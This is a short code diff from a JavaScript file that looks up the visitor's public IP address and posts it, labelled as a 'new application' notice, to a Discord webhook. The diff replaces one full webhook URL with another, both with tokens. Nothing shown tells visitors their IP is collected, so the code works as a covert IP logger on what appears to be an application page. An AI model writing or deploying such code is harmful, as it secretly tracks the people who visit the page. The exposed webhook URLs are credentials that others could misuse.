@@ -3,7 +3,7 @@ fetch("https://api.ipify.org?format=json")
   .then(response => response.json())
   .then(data => {
     const ip = data.ip;
-    const webhookUrl = "https://discord.com/api/webhooks/1394552647838732391/Dpd6h05vo3PRDzVOPz0p6_Si7jS-mNfcFVQUhYPZVt03qIMk3zhWqejH2EnaBGqo-1TQ";
+    const webhookUrl = "https://discord.com/api/webhooks/1394554954391355492/comU-mif2egSzF70Vx8BIyBr0yH4y2MuUOjbSKYql6As7GIu9kTxiIkZwv0xeJMOA1jI";
     
     const payload = {
       content: `📨 Neue Bewerbung: ${ip}`
